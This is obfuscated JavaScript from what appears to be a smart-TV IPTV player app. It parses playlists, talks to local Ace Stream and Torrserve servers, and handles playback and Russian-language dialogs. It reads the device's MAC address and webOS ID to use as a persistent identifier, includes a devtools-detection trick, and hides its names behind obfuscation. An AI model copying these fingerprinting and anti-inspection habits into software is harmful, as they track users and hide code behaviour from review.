function lIllllIF1l0O1I1IYpr(s,xu){var data=[],pl={};s=s.replace(/\r/g,"");dd1=new Date().getTime();var lQ10lsuK1l111Ypr=s.split('\n');var line,current={},pos,duration;try{for(var index=0;index<lQ10lsuK1l111Ypr.length;index++){var line=trim2(lQ10lsuK1l111Ypr[index]);if(line.indexOf('#EXTM3U')==0)pl=lIllllIF1l0O1I1IYprParams(line.substr(7));else if(line.indexOf('#PLAYLIST')==0)pl.title=line.substr(9);else if(line.indexOf('#ICON')==0)pl.icon=line.substr(5);else if(line.indexOf("#EXTGRP:")==0&&current.params)current.params.extgrp=trim2(line.substr(8));else if(line.indexOf("#EXTIMG:")==0&&current.params)current.params.extimg=trim2(line.substr(8));else if(line.indexOf("#BACKGROUND-IMAGE:")==0)pl["background-image"]=trim2(line.substr(18));else if(line.indexOf("#EXTINF:")==0){pos=line.indexOf(',');current.title=line.substr(pos+1).trim();line=line.substring(8,pos).trim();duration=line.match(/\s*(-?\d+)/)[0]||"-1";current.length=parseInt(duration);current.params=lIllllIF1l0O1I1IYprParams(line.substr(duration.length))}else if(line!=''&&line.indexOf("#")!=0&&current.params){var url=line;var el={"title":current.title,"logo_30x30":(current.params["tvg-logo"]||current.params.extimg),"stream_url":url,"tvg-name":current.params["tvg-name"],"tvg-id":current.params["tvg-id"],"tvg-shift":(current.params["tvg-shift"]||""),"group":(current.params["group-title"]||current.params.extgrp),"catchup_days":(current.params["catchup-days"]),"catchup_source":(current.params["catchup-source"]),"catchup":(current.params.catchup||current.params["catchup-type"])};if((xu&&xu.match(/(remotefo\.rk|8027|8028)\/treeview/)&&xu.indexOf(".m3u")==-1&&xu.indexOf(".xml")==-1)){var decu=decodeURIComponent(url);if(url.indexOf(".xml")>0||url.indexOf(".m3u")>0||url[url.length-1]=='/'||url[url.length-1]=='\\'||decu[decu.length-1]=='/'||decu[decu.length-1]=='\\'){el.playlist_url=decu;el.stream_url=""}}
for(var i in el)if(el[i]==null)delete el[i];data.push(el);current={}}}
pl["chan"+"nels"]=data}catch(e){kjtYpr.popUp(e.message,1500);return{"channels":[]}}
return pl}
function ll1O0l1IlglOO010Ypr(s,u){data=l0OIIlIIlONuu1111Ypr(s);var pl={"title":"Ace Stream","channels":[]}
if(data==null){pl.before="<center>Ошибка ответа от Ace Stream!<br>Проверьте запущена ли программа по адресу "+u+". <br> Если локальный IP адрес хоста вашего Ace Stream не совпадает - укажите его в Настройках приложения в Ace Stream direct</center>"}else{pl.before="<center>Ace Stream"+(data.error!=null?"<br>Ошибки: "+data.error:"")+"</center>";var obj=[];for(var i in data.result){obj.push({"id":i,"text":data.result[i]})}
obj.sort(function(a,b){str1=a.text;str2=b.text;try{var rx=/([^\d]+|\d+)/ig;var str1split=str1.match(rx);var str2split=str2.match(rx);for(var i=0,l=Math.min(str1split.length,str2split.length);i<l;i++){var s1=str1split[i],s2=str2split[i];if(s1===s2)continue;if(isNaN(+s1)||isNaN(+s2)){return s1>s2?1:-1}else return+s1-s2}}catch(e){return 0}
return 0});var data={};for(var i=0;i<obj.length;i++){pl.channels.push({"title":obj[i].text,"stream_url":u.replace("server/api?method=get_media_files","ace/getstream?_idx="+obj[i].id+"&"),"logo_30x30":"","description":""})}
for(var i=0;i<obj.length;i++){pl.channels.push({"title":"(hls) "+obj[i].text,"stream_url":u.replace("server/api?method=get_media_files","ace/manifest.m3u8?_idx="+obj[i].id+"&"),"logo_30x30":"","description":""})}}
return pl}
function llO0O0NBO0II10Ypr(s,u){data=l0OIIlIIlONuu1111Ypr(s);var pl={"title":"Torrserve","channels":[]}
if(data==null){pl.before="<center>Ошибка ответа от Torrserve!<br>Проверьте запущена ли программа по адресу "+u+". <br> Если локальный IP адрес хоста вашего Torrserve не совпадает - укажите его в Настройках приложения / TORRSERVE_IP</center>"}else{pl.before="<center>Torrserver<br>"+data.Name+"<br>Size: "+ToSize(data.TorrentSize)+" TotalPeers: "+data.TotalPeers+"</center>";for(var i in data.FileStats){pl.channels.push({"title":data.FileStats[i].Path,"stream_url":u+"&file="+data.FileStats[i].Id+" "+ToSize(data.FileStats[i].Length)})}}
return pl}
function capitalizeFirstLetter(string){return string.charAt(0).toUpperCase()+string.slice(1)}
function parsehms(s){s=s.replace(/\r/g,"").replace(/\n/g,"");if(!maJor.params.get("hms"))maJor.params.set("hms",maJor.params.get("remoteip").split(":")[0]+":45397");var channels=[],output={};try{var regexp=new RegExp("<img class=\"imagelist\" src=\"(.*?)\".*?title=\"(.*?)\" href=\"(.*?)\"","ig");while((ch=regexp.exec(s))!=null){channels.push({"title":ch[2],"logo_30x30":"http://"+maJor.params.get("hms")+ch[1],"playlist_url":"http://"+maJor.params.get("hms")+ch[3].replace("count=0","count=0;").replace("count=15","count=0;")})}}catch(e){}
output.channels=channels;return output}
function parsexspf(s){s=s.replace(/\r/g,"").replace(/\n/g,"");var channels=[],output={};try{var regexp=new RegExp("<track>(.*?)<\/track>","ig");while((ch=regexp.exec(s))!=null){var title="",url="",ico="";var mtc=ch[1].match(/<title>(.*?)<\/title>/);if(mtc){title=mtc[1]}
var mtc=ch[1].match(/<image>(.*?)<\/image>/);if(mtc){ico=mtc[1]}
var mtc=ch[1].match(/<location>(.*?)<\/location>/);if(mtc){url=mtc[1]}
if(title=="")title=url.split("/")[url.split("/").length-1];channels.push({"title":title,"logo_30x30":ico,"stream_url":url})}}catch(e){}
output.channels=channels;return output}
function xmlTagToChArr(s,tag,tags){var result=[],i=0;var regexp=new RegExp("<"+tag+">(.*?)</"+tag+">","ig");while((ch=regexp.exec(s))!=null){result.push({});for(var j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";result[i][tags[j]]=trim2(res)}
i++}
return result}
function l01O10IilOoIIO1Ypr(s){s=s.replace(/\r/g,"").replace(/\n/g,"");var channels=[],i=0,output={},cat_id={};try{var regexp=new RegExp("<category>(.*?)<\/category>","ig");while((ch=regexp.exec(s))!=null){var reg2=new RegExp("<category_id>(.*?)</category_id>","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";var reg2=new RegExp("<category_title>(.*?)</category_title>","ig");if((t=reg2.exec(ch[1]))!=null){res2=t[1].replace("<![CDATA[","").replace("]]>","")}else res2="";cat_id[res]=res2}
var regexp=new RegExp("<channel>(.*?)(</channel>|$)","ig");while((ch=regexp.exec(s))!=null){channels.push({});tags=pltags;for(var j=0;j<tags.length;j++){if(tags[j]=="group")continue;var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1];if(res&&tags[j]=="SetTimeInterval"){try{var x=xmlToJSON.parseString("<SetTimeInterval>"+res+"</SetTimeInterval>");if(x!=null)channels[i].SetTimeInterval=x.SetTimeInterval}catch(e){}
continue}
res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";if(tags[j]=="category_id"){var resspl=res.split(",");res="";for(var k=0;k<resspl.length;k++){if(res!="")res+=";";if(typeof cat_id[resspl[k]]!="undefined")res+=cat_id[resspl[k]];else res+=resspl[k]}
channels[i].group=trim2(res)}else channels[i][tags[j]]=trim2(res)}
var subs=xmlTagToChArr(ch[1],"submenu",pltags);if(subs.length)channels[i].submenu=subs;i++}
var menu=[],i=0;var regexp=new RegExp("<menu>(.*?)</menu>","ig");var tmps=s.replace(/<style>.*?<\/style>/ig,"");while((ch=regexp.exec(tmps))!=null){menu.push({});tags=pltags;for(var j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";menu[i][tags[j]]=trim2(res)}
var subs=xmlTagToChArr(ch[1],"submenu",pltags);if(subs.length)menu[i].submenu=subs;i++}
var style=null;var regexp=new RegExp("<style>(.*?)</style>","ig");while((ch=regexp.exec(s))!=null){result=xmlToJSON.parseString(ch[1]);style=collect(style,result)}}catch(e){}
try{tags=plgltags;s=s.replace(/<channel>.*?<\/channel>/ig,"");s=s.replace(/<menu>.*?<\/menu>/ig,"");s=s.replace(/<style>.*?<\/style>/ig,"");for(j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(s))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";output[tags[j]]=res}}catch(e){}
output.channels=channels;if(menu.length)output.menu=menu;if(style)output.style=style;return output}
img_dir="img";lOIOOIIIOp0uOlOOI0Ypr=lOI0lOlbQIllOYpr="obovse.ru";var xhrl={},cached={"start":""},prload=!1,prloadi=!1;nServer=-1;function l0O0l0111mJXG1OII1OYpr(url){if((url||(gP("lII1I1PVBuI1lIlYpr"))||"")=="about:blank")return 1;return 0}
function is_audio(url){url=url||vPlayer.playUrl||"";if(url.match(/^(audio:\/\/|.*\.mp3)/))return!0}
function is_vod(url){try{url=url||vPlayer.playUrl||"";if(gP("global")["is_iptv"]=="false")return 2;if(gP("global")["is_iptv"]=="true"||gP("global")["is_iptv"]>0)return 0;if(!url||url.match(/\/ace\//i))return 1;if(handler=="player"){if(vPlayer.getCur()>0&&vPlayer.getTotal()>40&&vPlayer.getTotal()<11*3600)return 1}
if(url.indexOf("hls/tracks-")>0||url.indexOf(":5555/")>0)return 2;else return 0}catch(e){return 1}}
function is_img(url){url=url||vPlayer.playUrl||"";if(url.match(/\.(jpg|gif|png|jpeg)/i)||url.indexOf("image/")==0)return!0;else return!1}
function logtime(mode){return}
var statusTimer,statusTimer2;function statusbar(text,mode){if(typeof text=="undefined")text="";if(!$_("statbar2"))onfly();if((handler=="player"||handler=="qual")&&$_("loading").style.display!="block"&&text!="off")return;clearTimeout(statusTimer);var timer=45000;if(mode==null){timer=1000;mode=""}
if(text=="off")$_("statbar2").style.display="none";else{if(mode=="hint"){timer=10000}else if(mode=="link"){if(text.indexOf("curl")==0){var curl=parseCURL(text);text=curl.url;if(curl.method=="POST")text+=" "+curl.body}
text=text.split("#POST")[0];if(text.indexOf("?list=")>0){text=unescape(text.split("?list=")[1])}
text=text.replace(/.box_client=lg.*/,"");text=text.replace(/.w_lang=.*/,"");text=text.replace(/.*?\/xhr.php.../,"...");text="_FPOzhidanie_ "+text}else if(mode=="dns"){text="_FPOzhidanie_ DNS "+text}else if(mode=="translate"){timer=60000;text="_FPOzhidanie_ "+text}else if(mode=="copy"){timer=900000}
if(mode=="fulllink"){if(text.lastIndexOf("http")>5){var text="_FPOzhidanie_ "+"http"+decodeURIComponent(text.split("http")[1])}else text="_FPOzhidanie_ "+text}
if(booting)$_("statbar2").style.zIndex=3;else $_("statbar2").style.zIndex=1;$_("statbar2","<div id='textbar' style='height: 100%;display:inline-block;padding:0px 2px;margin: auto 0px;max-width:300px;overflow:hidden;text-overflow: ellipsis;color:#7D7D7D;background-color:#FAFAFA;'>"+text+"</div>");clearTimeout(statusTimer2);statusTimer2=setTimeout(function(){$_("textbar").style.maxWidth=""},2200);$_("statbar2").mode=gV(mode);$_("statbar2").style.display="block";statusTimer=setTimeout('$_("statbar2").style.display="none";',timer)}}
if(maJor.platform()=="tizen"&&typeof webapis=="undefined"){l1OO1III0XvIvOlII1lYpr("$WEBAPIS/webapis/webapis.js")}
var ua_chrome="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36";setTimeout(function(){if(maJor.platform().match(/lg/)){uHelper.create("directnoheader").hid().get("file:///sys/class/net/eth0/address").parse=function(s){if(gV(s)!=""){maJor.ID=kjtYpr.serial=s.replace(/:/g,"").replace(/(\r|\n)/,"");maJor.writeC("ID",maJor.ID);maJor.write("ID",maJor.ID);maJor.write("IDS",maJor.ID);maJor.writeC("IDS",maJor.ID)}}
if(typeof webOS!="undefined"){webOS.service.request("luna://com.webos.service.sm",{method:"deviceid/getIDs",parameters:{"idType":["LGUDID"]},onSuccess:function(inResponse){if(typeof inResponse.idList[0].idValue!="undefined"){lg_uid=inResponse.idList[0].idValue.split("-")[4].replace(/(\r|\n)/,"")}},onFailure:function(inError){return}});webOS.service.request("luna://com.webos.service.tv.systemproperty",{method:"getSystemInfo",parameters:{"keys":["modelName","firmwareVersion","UHD","sdkVersion"]},onComplete:function(inResponse){var isSucceeded=inResponse.returnValue;if(isSucceeded){maJor.lg_model=inResponse.modelName;lg_v=inResponse.sdkVersion}else{return}}})}}},100);try{if(maJor.platform()!="maple"){var el1=new Image();Object.defineProperty(el1,'id',{get:function(){}});console.dir(el1);setInterval(function(){},1000)}}catch(e){}
var Player={mode3D:0,h:0,w:0,cur_time:0,total_time:0,isMuted:!1,oncur:0};var allMenuObject;var allExitObject;var currentType="";var defaultClass=["stopButton","playButton","rewindButton","forwardButton","optionButton","prevButton","prevButton","nextButton"];var exitBtnClass=["backKey","exitKey"];var video;var TIME_FOR_SEEK=10;var rowID=1;var cntIndex=1;var ll0Q10Pu10O10l1IlYpr=-1;var oldBuffer=0;var media=null,fst=!1,icoclose='data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAAm0lEQVQoU2WPMQrCQBREU1imSOkBPEYOlWN9SGFhYWFpyoCBFEE8go1gYalvllk1yYcHs7NvE34REW84Q1kshm4HF3jpMMFKJtdw992kYqvgIskg6enuCFV+/S/38HBuYZOkPBSSbxbEHuaShnIpdjBfkKKC/OsBrs6/BRVc6EKyvrxaUOLJRZLSa0bZne5aFTqM8JXyqINDRDQfRgrEgHddNAMAAAAASUVORK5CYII=';var icoerr='data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAACNElEQVR4Xu3Yvy50URQF8ClEJyQ0NF5AoaBSKLUSnUJoRUuCRCQ8AAoFmV5ColKbQiSUvALPgCjGOsmZZOdm3z13rj1/7pm1kl/x5e579rmrmMhX80qz2UySW7TDU+AW7fAUuEU7PAVu0Q5PgVu0w1PgFu3wFLhFOzwFbtEOT4FbtMNT4Bbt8BS4pdFo7PTRpPZxHtyCSzb7aE77OA9uUS7dS5Ur6Be+/+kH5Jnh39pcMA+j0Yj2oWW5BReTH3MKM/+0DvLMNdDmgpCP6ET70LLcgovJj9nTlnUCZ6xkzlzW5gI8exNzF9pMWW4RFwxYUDbigkGvC9qGY+EoOoQx7Z2i3IKLyI/paUES5sLfRa13wg/4jDZXlFvEpQIWlI24VJBbEJ6Nw3Q0pc0EeDa0BV3CV/SkzQR4NrQFXYm5V20mwDMWBCwoC8/KFnQH5wU8QuudoSqoDBbURiULCn/pvkc32kyAZ0tirhOfUN2Cug27q/0j3W3YzYIs2M2CLNjNgizYzYIs2M2CLNjNgizYzYIs2M2CLNjNgizYzYIs2M2CLNidTkGYm4DVDsxq50iYSaqghcx77Wxp50iYYUEWzLAgC2aqXRCeHcBLdAuLHTiD1rv1nPMrX1Ch/5PWYL4u3n3OmWFBUbIFbcB1dKjN5MH8pnh3P2cmnR/pbsBuFmTBbhZkwW4WZMFuFmTBbhZkwe5KFPQAu31yDwNf0KBgQW2woDYGpyCGYRiGYRiGYRimYGq1P0bl7L47Cp9jAAAAAElFTkSuQmCC';function getTimeFromMS(sec){var time=Math.round(sec);var hours=Math.floor(time/3600);var mins=Math.floor((time%3600)/60);var secs=Math.floor((time%3600)%60);if(hours<0||mins<0||secs<0)return"&#8734;";if(hours<10)
hours="0"+hours;if(mins<10)
mins="0"+mins;if(secs<10)
secs="0"+secs;return hours+":"+mins+":"+secs}
var curTime=0,totalTime=0;var sendr=!0,sendonce=!0,kklp=0;var confirmed={create:function(text,title,but,style){var c=this;c.close();c.title=title;c.select=0;if(but==null)but="_FPProdolzhit_|_FPOtmena_";c.but=but.split("|");c.fun0=function(){};c.fun1=function(){};if(title==null)title="_FPConfirm action_";c.title=title;c.template="<div style='background-color:#556266;;margin:0px 0px 0px 0px;overflow:hidden;'>"+"<div id='confirmTitle' style='margin:5px;overflow:hidden;text-align:left;font-size: 122%;'>{title}</div>"+"<div id='confirmText' style='margin:4px;overflow:hidden;text-align:center;'>{text}</div>"+"<div id='confirmButtons' style='padding:3px;text-align:right;height:31px;'>{buttons}</div>"+"</div>";c.render(text,style);return c},sel:function(n){var c=this;if(n=="++")c.select++;else if(n=="--")c.select--;else c.select=n;if(c.select<0)c.select=c.but.length-1;else if(c.select>=c.but.length)c.select=0;for(var i=0;i<c.but.length;i++){if(i==c.select)$_("dnsc"+i).style.backgroundColor='#307ebc';else $_("dnsc"+i).style.backgroundColor='transparent'}},click:function(n){var c=this;if(n!=null)c.select=n;handler="menu";if(c.select==0)c.fun0();else if(c.select==1)c.fun1();c.close()},render:function(text,style){var c=this;var div=document.createElement('div');div.id="l1Q0011lOE10u1OQ1O1Ypr";div.style.position="absolute";div.style.textAlign="center";div.style.border="";div.style.borderRadius="";div.style.fontSize=css_wh(22)+"px";div.style.zIndex="1";div.style.visibility="hidden";div.style.width=css_w(560)+"px";div.style.left=css_w(355)+"px";if(style=="fullscreen")style={"width":"1250px","height":"690px","left":"10px","top":"10px","textAlign":"left","overflow":"hidden"};if(style!=null)for(var i in style)div.style[i]=style[i];if(text==null){text="_FPOshibka_ _FPopredDns_!<br>  Смените днс или установите RemoteFork на PC или Android<br>_FPVseRavnoProdolzhit_?";if(maJor.platform()=="android"){text="Установить RemoteFork.apk на это Android устройство?<br>Если Remotefork уже установлен то нажмите _FPOtmena_ и запустите его<br>Подробнее http://forkplayer.tv/smart-tv/remotefork/";c.but="_FPDownload RemoteFork_|_FPOtmena_"}}
if(maJor.box_low)var st="";else st="word-wrap: break-word;overflow-wrap: break-word;";var buttons="";for(var i=0;i<c.but.length;i++){buttons+="<span id='dnsc"+i+"' class='cbutton' onmousemove=\"confirmed.sel("+i+");\" onclick=\"confirmed.click("+i+");\" style='background-color:red;'>"+c.but[i]+"</span>"}
var inner=c.template.replace("{title}",c.title).replace("{text}",text).replace("{buttons}",buttons);$_("main").appendChild(div);$_("l1Q0011lOE10u1OQ1O1Ypr",inner);handler="confirm";setTimeout(function(){handler="confirm";var x=720-$_("l1Q0011lOE10u1OQ1O1Ypr").offsetHeight;if(x<10)x=10;if(x>205)x=205;$_("l1Q0011lOE10u1OQ1O1Ypr").style.top=x+"px";$_("l1Q0011lOE10u1OQ1O1Ypr").style.visibility="visible";$_("main").onclick=function(){confirmed.click(1)}},25);c.sel(1)},close:function(){if($_("l1Q0011lOE10u1OQ1O1Ypr")!=null)$("#l1Q0011lOE10u1OQ1O1Ypr").remove();$_("main").onclick=""}};function remoteAsk(){maJor.Remote.init();confirmed.create("Для торрент ссылок magnet: torrent://  необходим Ace Stream или Torrserve, для torrentb64:// Ace Stream! Проверьте запущен ли Ace Stream на "+getip("acestream")+" или Torrserve на "+getip("torrserve")+"<br>Или пропишите правильный IP в Настройках приложения","Необходим Ace Stream или Torrserve","_FPNastroiki_ IP|_FPOtmena_").fun0=function(){olI11lQ1OhFv1II1Ypr({"playlist_url":"about:settings","defaultSelect":24})}}
function sbrosok(noreload){try{for(var i in allfs){maJor.write(allfs[i],"")}
kjtYpr.l000Olt0SO1OlO0Ypr("vk_audio_pl","");kjtYpr.l000Olt0SO1OlO0Ypr("vk_audio_sel","");for(var key in localStorage){localStorage.removeItem(key)}}catch(e){kjtYpr.popUp(e)}
document.cookie="";if(maJor.ID)maJor.params.set("ID",maJor.ID);if(maJor.IDS)maJor.params.set("IDS",maJor.IDS);if(maJor.oID)maJor.params.set("oID",maJor.oID);kjtYpr.setDefault();IlO11lQ0().history=[];insetActive=0;prev={};statusbar("Сброс выполнен!");if(!noreload){kjtYpr.popUp("_FPSbrosVipolnenPerezpusk_...");setTimeout('document.location.reload();	location.reload();',700)}}
playIdent="";function replaceArray(s,find,replace){var replaceString=s;for(var i=find.length-1;i>=0;i--){replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i]);replaceString=replaceString.replace(find[i],replace[i])}
return replaceString};function replaceArrayG(s,find,replace){var replaceString=s;for(var i=find.length-1;i>=0;i--){while(replaceString.indexOf(find[i])!=-1)replaceString=replaceString.replace(find[i],replace[i]);}
return replaceString};function parse_urld(u){var f=["shtorm","tv","live",".m3u8","hls","streaming","udp",":1",":8"];var t=["shipset","fp_tv","fp_live","_translation.m3u8","live_hlsstream","streamtving","live/udp/xy",":8081/streamudp/",":8088/streamudp/"];return replaceArray(u,t,f)}
function parse_urlm(u,m){var orig_u=u;u=u.replace(".m3u8","");if(u.indexOf("/hls/userencrypt/")>0){u=u.split("/hls/userencrypt/")[1];var t=["aHR0cDovL","=","S","z","M","b","1"];var md=md5(ipG+maJor.getId());var f=[];for(var i=0;i<7;i++)f[i]=md.substr(i*4,4);var s=replaceArrayG(u,f,t);var p=atob(s).split("-9-");if(typeof p[1]=="undefined"){kjtYpr.popUp("Error decode link! Please restart application. Your ip: "+ipG,2000);return""}else if(p[1].indexOf(gP().lII1I1PVBuI1lIlYpr.split("#CAT=")[0])==0&&p[1].indexOf(maJor.getId())>0)return p[0];else{kjtYpr.popUp("Error decode this link! Please restart application. Your ip: "+ipG,2000);return""}}else{u=u.substr(28);var f=["shorted","translation","5HtRyF","6TrEdS","LKKfr","LJJlMn","HGGffR"];var t=["aHR0cDovL","=","S","F","M","b","0"];var s=replaceArrayG(u,f,t);p=atob(s).split("-9-")}
if(m)return p[0];if(typeof p[3]!="undefined"){}
if(typeof p[1]!="undefined"){if(p[1].indexOf(gP("lII1I1PVBuI1lIlYpr"))==0&&p[1].indexOf(maJor.getId())>0)return p[0];else return orig_u}
return p[0]}
function imgonload(t){vPlayer.setLoading("off",Math.random());statusbar("off");var x=t.width;var y=t.height;var ratioX=x/maJor.screen().w;var ratioY=y/maJor.screen().h;if(y/ratioX>720)t.height=y/ratioY;else t.width=x/ratioX;t.style.visibility='visible';if(vPlayer.audio.played()&&$_("vk_audio").style.zIndex=="0"){$_("vk_audio").style.zIndex="-5";$_("vk_audio").style.display="none"}}
var slide_mode=5000,listener;var rek_curtime=0,rek_totaltime=0,rek_curtimeint,rek_sel=1;function rekBox(text,rek_curtime){if(is_rek){$_("playerBottom").style.height=css_wh(20)+"px";$_("playerBottom").style.top=css_wh(maJor.screen().h-11)+"px";if(rek_sel<0)rek_sel=1;else if(rek_sel>1)rek_sel=0;if(text!=null){$_("rek_button2").style.display="block";$_("rek_button2",text)}else if(Point["ClickThrough"]!=""&&typeof Point["linkTxt"]!="undefined"&&rek_type!="buzolla"){$_("rek_button1").style.display="block";if(Point["linkTxt"].split("%").length>4)Point["linkTxt"]=decodeURI(Point["linkTxt"]);$_("rek_button1","<b>Перейти по ссылке</b><br>"+Point["linkTxt"])}else $_("rek_button1").style.display="none";if($_("rek_button1").style.display=="none")rek_sel=1;if(rek_sel==0){$_("rek_button1").style.border="4px solid white";$_("rek_button2").style.border="1px solid gray"}else if(rek_sel==1){$_("rek_button1").style.border="1px solid gray";$_("rek_button2").style.border="4px solid white"}}else{$_("playerBottom").style.top="76%";$_("playerBottom").style.height="158px"}}
var plDesc=0;function lII11lAO1IOllYpr(url,m,start,jwtype){vPlayer.audioCur=0;try{var curPage=gP();is_loadpage(0);if(url=="description"){plDesc=0;$_("loading").style.display="none";$_("infPl","TEXT");vPlayer.playUrl=url;vPlayer.paused=!1;video.style.display="none";$_("jw").style.display="block";var b="<div style='background-color:#ccc;padding:15px;'>"+vPlayer.playElement.description+"</div>";$_("jw",b);statusbar("off");return}else rekBox();if(vPlayer.audio.played()){$_("vk_audio").style.zIndex="-2";$_("vk_audio").style.display="none";$_("vk_play_button").style.display="block";vPlayer.lIOQ0lI1iZm1hQ1O0Ypr()}
if(url.indexOf("sess-")>0)url=url.replace(/\/sess-.{38}\//,"/videos/");if(maJor.params.get("udp")){if(url.indexOf("udp://")==0)
url=url.replace("udp://@","http://"+maJor.params.get("udp")+"/udp/").replace("udp://","http://"+maJor.params.get("udp")+"/udp/");if(url.indexOf("rtp://")==0)
url=url.replace("rtp://@","http://"+maJor.params.get("udp")+"/rtp/").replace("rtp://","http://"+maJor.params.get("udp")+"/rtp/")}
if(maJor.platform()=="mag"&&url.indexOf("ffrt")==-1&&is_m3u8(url))url="ffrt2 "+url;if(url.indexOf("acestream://")==0)url="http://"+getip("acestream")+"/ace/manifest.m3u8?id="+url.replace("acestream://","")+"";if(url.indexOf("#AUDIO=")>0){vPlayer.playUrl=url.split("#AUDIO=")[0];vPlayer.playUrlAudio=url.split("#AUDIO=")[1];vPlayer.audioplay(vPlayer.playUrlAudio)}else vPlayer.playUrl=url;vPlayer.end_ok=!1;vPlayer.curTime=0;if(url.indexOf("/dtv/usb/")==0){url=url.replace("$USB_DIR/")}else if(url.indexOf("/")==0&&maJor.platform()=="android-device"&&!lIllO0Imlel1IlI1Ypr.match(/manual|media|vimu/)){}else if(url.indexOf("/")==-1){vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();kjtYpr.inf("_FPNevernayaSsilka_",1200);return}
if(!rek_url){clearTimeout(vPlayer.timeoutWork);vPlayer.timeoutWork=setTimeout(function(){if(vPlayer.curTime<1&&!vPlayer.totalTime)gP().sendStat(0)},28000)}
sethash(vPlayer.playUrl);vPlayer.stopped=0;vPlayer.paused=0;vPlayer.iptv_succed=0;if(maJor.platform()=="android-device"&&lIllO0Imlel1IlI1Ypr.match(/manual|media|vimu/)){if(maJor.build>=7){var ex={"type":"video","player":lIllO0Imlel1IlI1Ypr,"header":{},"title":gV(vPlayer.playElement,"title"),"url":url};if($_("epg_full").style.display!="none")ex.title=$_("epg_full").innerHTML.replace(/<br>/g,"\n").replace(/<.*?>/g,"");andr.exec(ll1lI1lI0sl0OlIYpr(ex))}else{andr.cmd("video"+url)}}else{vPlayer.fst=!0;vPlayer.setWhitestripes();vPlayer.player().start(vPlayer.playUrl,start)}
if(vPlayer.playElement&&gV(vPlayer.playElement.event,"onstartvideo")){var myImage=new Image(1,1);myImage.src=maJor.addident(vPlayer.playElement.event.onstartvideo)}}catch(e){kjtYpr.popUp("Play "+url.substr(0,15)+"...<br>"+e.message,5000)}}
var last_w=0,last_h=0;var iptv_succed=!1;var timeF=0;function focuschange(h){if(h.match(/false/i)){timeF=T.inetTime}
if(h.match(/true/i)&&(handler=="player"||handler=="qual")){if(timeF>0&&(T.inetTime-timeF)>40000){vPlayer.endvideo(1)}else vPlayer.lIOQ0lI1iZm1hQ1O0Ypr()}}
var is_adult=!1;var pstr="",is_arc=!1;function playVast(url){if(url){rek_url=url;pstream=(rek_url.indexOf(".m3u8")>0)?1:0;lIllO0Imlel1IlI1Ypr=(pstream)?maJor.params.get('streamplayer'):maJor.params.get('player');if(maJor.platform()=="android-device")lIllO0Imlel1IlI1Ypr="html5";if(maJor.platform()=="maple")lIllO0Imlel1IlI1Ypr="media";if(ttmac){setTimeout('kjtYpr.popUp("REK: '+rek_url+'", 2000);',6500)}
handler="player";vPlayer.playElement={};lII11lAO1IOllYpr(rek_url);return}}
var qch_num="",qch_timer;function setKey(k){clearTimeout(qch_timer);qch_timer=setTimeout(function(){qch_num=parseInt(qch_num);if(qch_num>gP().channels.length){qch_num=gP().channels.length}
IlO11lQ0().focused(qch_num-1);qch_num=""},1300);qch_num=qch_num+k;kjtYpr.popUp("Select to: "+(qch_num<=0?"Inset":qch_num),1500,"on",!0)}
function getIdent(sel){sel=sel||getSelect();if(sel>=0){var ch=gP("channels")[sel];if(!ch||(rek_url&&sel==null))return"";var gi=gV(ch,"ident");if(gi){if(gi.length==10)return gi;else return md5(gi).substr(0,10)}
var title=ch.title.replace("[HD] ","").replace("[SD] ","");var s="";try{if(ch.stream_url.indexOf("audio")==0)return"";s=IlO11lQ0().get("title",-1)+"-"+title;s=s.replace(/_FPGlobPoisk_.*?"/,"");return md5(s).substr(0,10)}catch(e){}}
return""}
var optScreen=["_FPOriginal_","_FPRastyanut_","_FPRuchnoi_"];var optLang=["Нет","ru","rus","ua","en","eng","de","fr","lt","et"],optLangSel=0,optId=[];function newOptions(){var llO0I111lvwajllII11Ypr="",id=0,curA;if(vPlayer.playElement&&vPlayer.playElement.json_url){for(var i in vPlayer.playElement.json_url){if(gV(vPlayer.playElement,"json_select")!=i)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,i+"p "+gV(vPlayer.playElement.json_url[i],"type"),!0,"enterqual"+i)}
if(id<2){llO0I111lvwajllII11Ypr="";id=0}}
